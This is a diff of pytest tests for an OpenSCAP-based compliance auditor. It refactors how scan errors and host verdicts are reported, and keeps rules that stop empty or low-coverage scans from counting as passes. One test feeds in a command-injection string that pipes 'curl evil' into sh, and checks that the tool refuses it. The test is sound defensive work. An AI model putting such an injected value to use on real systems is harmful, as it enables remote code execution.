@@ -9,12 +9,11 @@ from __future__ import annotations
 
 import pytest
 
+from grc_auditor.assess import scan_verdict
 from grc_auditor.detect import ScanPlan
-from grc_auditor.models import (
-    HostRecord, HostStatus, ScanResult, finalize_scan_status,
-)
+from grc_auditor.models import HostRecord, HostStatus, ScanResult
 from grc_auditor.remote import CommandResult
-from grc_auditor.scan import parse_xccdf_results, scan_host
+from grc_auditor.scan import ScanFailed, parse_xccdf_results, scan_host
 
 from conftest import FakeRemoteHost, fixture_path
 
@@ -34,13 +33,15 @@ def test_malicious_mktemp_output_is_refused(tmp_path):
         ("mktemp", CommandResult(0, "/tmp/grc_audit.aaaaaa$IFS;curl evil|sh;#", "")),
     ])
     host = HostRecord(ip="10.0.0.9")
-    with pytest.raises(RuntimeError):
+    with pytest.raises(ScanFailed) as caught:
         scan_host(host, conn, _plan(), "runid", str(tmp_path))
-    assert host.status is HostStatus.SCAN_ERROR
-    assert "unexpected path" in (host.detail or "")
+    assert "unexpected path" in caught.value.detail
+    # Refused before any sudo command: only mktemp ran.
+    assert conn.commands == ["mktemp -d /tmp/grc_audit.XXXXXX"]
+    assert host.status is HostStatus.DISCOVERED   # assess records the verdict
 
 
-def test_scan_host_happy_path_marks_scanned(tmp_path):
+def test_scan_host_happy_path_returns_a_certifiable_scan(tmp_path):
     results_xml = open(fixture_path("xccdf-results.xml"), encoding="utf-8").read()
     conn = FakeRemoteHost(
         responses=[
@@ -52,8 +53,9 @@ def test_scan_host_happy_path_marks_scanned(tmp_path):
     )
     host = HostRecord(ip="10.0.0.9")
     scan = scan_host(host, conn, _plan(), "runid", str(tmp_path))
-    assert host.status is HostStatus.SCANNED
+    assert scan_verdict(scan).status is HostStatus.SCANNED
     assert (scan.passed, scan.failed) == (3, 2)
+    assert host.status is HostStatus.DISCOVERED   # scan_host never writes it
 
 
 def test_scan_host_oscap_error_marks_scan_error(tmp_path):
@@ -62,9 +64,10 @@ def test_scan_host_oscap_error_marks_scan_error(tmp_path):
         ("xccdf eval", CommandResult(1, "", "bad profile")),
     ])
     host = HostRecord(ip="10.0.0.9")
-    with pytest.raises(RuntimeError):
+    with pytest.raises(ScanFailed) as caught:
         scan_host(host, conn, _plan(), "runid", str(tmp_path))
-    assert host.status is HostStatus.SCAN_ERROR
+    assert caught.value.detail == "oscap error (exit 1): bad profile"
+    assert str(caught.value) == caught.value.detail
 
 
 def test_scan_host_no_results_file_marks_scan_error(tmp_path):
@@ -75,9 +78,12 @@ def test_scan_host_no_results_file_marks_scan_error(tmp_path):
         ("test -f", CommandResult(1, "", "")),
     ])
     host = HostRecord(ip="10.0.0.9")
-    with pytest.raises(RuntimeError):
+    with pytest.raises(ScanFailed) as caught:
         scan_host(host, conn, _plan(), "runid", str(tmp_path))
-    assert host.status is HostStatus.SCAN_ERROR
+    assert caught.value.detail == (
+        "oscap exited 0 but produced no results.xml at "
+        "/tmp/grc_audit.Ab3xZ9/results.xml (see oscap.stderr.txt)"
+    )
 
 
 # --- scan chokepoint (never-false-pass: zero-outcome / sub-floor != SCANNED) --
@@ -91,27 +97,25 @@ def _scan(passed=0, failed=0, error=0, not_applicable=0, not_checked=0,
 
 def test_zero_outcome_scan_is_not_certified_scanned():
     # An oscap success that produced no rule outcomes must NOT read as a clean host.
-    host = HostRecord(ip="10.0.0.9")
-    finalize_scan_status(host, _scan())          # all zeros -> evaluated nothing
-    assert host.status is HostStatus.SCAN_ERROR
-    assert host.scan is not None                  # evidence still attached
-    assert "no rule outcomes" in host.detail
+    # (test_assess checks the evidence stays attached to the host.)
+    verdict = scan_verdict(_scan())               # all zeros -> evaluated nothing
+    assert verdict.status is HostStatus.SCAN_ERROR
+    assert "no rule outcomes" in verdict.detail
 
 
 def test_sub_floor_confidence_scan_is_not_certified_scanned():
     # 100% score but only 10 of 200 checks ran -> 5% confidence, below the hard
     # floor. A near-empty scan can never be SCANNED regardless of the badge knob.
-    host = HostRecord(ip="10.0.0.9")
-    finalize_scan_status(host, _scan(passed=10, not_checked=190, score=100.0))
-    assert host.status is HostStatus.SCAN_ERROR
-    assert "hard floor" in host.detail
+    verdict = scan_verdict(_scan(passed=10, not_checked=190, score=100.0))
+    assert verdict.status is HostStatus.SCAN_ERROR
+    assert "hard floor" in verdict.detail
 
 
 def test_adequately_covered_scan_is_scanned():
     # 70% definitive -> above the floor; a real (if still badge-low) scan.
-    host = HostRecord(ip="10.0.0.9")
-    finalize_scan_status(host, _scan(passed=70, failed=0, not_checked=30, score=100.0))
-    assert host.status is HostStatus.SCANNED
+    verdict = scan_verdict(_scan(passed=70, failed=0, not_checked=30, score=100.0))
+    assert verdict.status is HostStatus.SCANNED
+    assert verdict.detail is None
 
 
 def test_build_oscap_argv_adds_fetch_remote_resources_only_when_configured():
@@ -174,19 +178,18 @@ def test_scan_host_honors_plan_sudo_false(tmp_path):
 def test_notselected_heavy_scan_is_certified_scanned():
     # A complete scan whose datastream is mostly out-of-profile (notselected ->
     # `other`) certifies as SCANNED -- notselected rules are not "unrun" checks.
-    host = HostRecord(ip="10.0.0.9")
-    finalize_scan_status(host, _scan(passed=238, failed=109, not_applicable=51,
-                                     other=241, score=69.4))
-    assert host.status is HostStatus.SCANNED
+    verdict = scan_verdict(_scan(passed=238, failed=109, not_applicable=51,
+                                 other=241, score=69.4))
+    assert verdict.status is HostStatus.SCANNED
 
 
 def test_all_notselected_scan_is_not_certifiable():
     # Degenerate: oscap emitted outcomes but none owed a verdict (all notselected).
     # Nothing to certify -> SCAN_ERROR, never a clean pass (never-false-pass).
-    host = HostRecord(ip="10.0.0.9")
-    finalize_scan_status(host, _scan(other=17))
-    assert host.status is HostStatus.SCAN_ERROR
-    assert host.scan is not None              # evidence still attached
+    # (test_assess checks the evidence stays attached to the host.)
+    verdict = scan_verdict(_scan(other=17))
+    assert verdict.status is HostStatus.SCAN_ERROR
+    assert "no scorable verdict" in verdict.detail
 
 
 def test_empty_results_file_does_not_become_a_clean_scanned_host(tmp_path):
@@ -196,9 +199,7 @@ def test_empty_results_file_does_not_become_a_clean_scanned_host(tmp_path):
     p.write_text("", encoding="utf-8")
     scan = parse_xccdf_results(str(p))
     assert scan.total_outcomes == 0
-    host = HostRecord(ip="10.0.0.9")
-    finalize_scan_status(host, scan)
-    assert host.status is HostStatus.SCAN_ERROR
+    assert scan_verdict(scan).status is HostStatus.SCAN_ERROR
 
 
 _BILLION_LAUGHS = """<?xml version="1.0"?>
@@ -356,9 +357,9 @@ def test_unknown_verdicts_count_as_undetermined_not_out_of_scope(tmp_path):
     assert scan.other == 1          # only 'notselected' is out-of-scope
     # 1 definitive of 3 owed -> ~33%, well below the 50% hard floor.
     assert scan.assessment_confidence is not None and scan.assessment_confidence < 50.0
-    host = HostRecord(ip="10.0.0.1")
-    finalize_scan_status(host, scan)
-    assert host.status is HostStatus.SCAN_ERROR   # never a clean pass
+    verdict = scan_verdict(scan)
+    assert verdict.status is HostStatus.SCAN_ERROR   # never a clean pass
+    assert "hard floor" in verdict.detail
 
 
 def test_notselected_outcomes_do_not_lower_confidence():
